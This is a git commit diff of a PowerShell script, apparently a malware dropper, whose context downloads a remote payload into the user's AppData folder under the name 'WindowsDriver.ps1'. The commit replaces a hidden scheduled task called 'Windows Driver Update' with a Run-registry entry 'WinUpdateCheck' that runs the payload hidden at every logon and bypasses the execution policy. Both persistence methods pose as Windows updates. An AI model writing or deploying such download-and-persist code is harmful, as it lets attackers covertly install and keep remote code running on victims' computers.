6310e07654cbc10a28c3b7916ed1b13651a1a631
JiriWeiss <75065909+JiriWeiss@users.noreply.github.com>
2025-05-21 11:28:27 +0200

    Update Volkswagen2.ps1

--- Volkswagen2.ps1
+++ Volkswagen2.ps1
@@ -4,7 +4,4 @@ $localPath = "$env:APPDATA\WindowsDriver.ps1"
 Invoke-WebRequest -Uri $payloadUrl -OutFile $localPath
 
 # 2. Nastav persistenci (např. pomocí Scheduled Task)
-$taskName = "Windows Driver Update"
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -File "$localPath""
-$trigger = New-ScheduledTaskTrigger -AtLogOn
-Register-ScheduledTask -Action $action -Trigger $trigger -TaskName $taskName -Description "System driver check" -Force
+Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUpdateCheck" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localPath`""
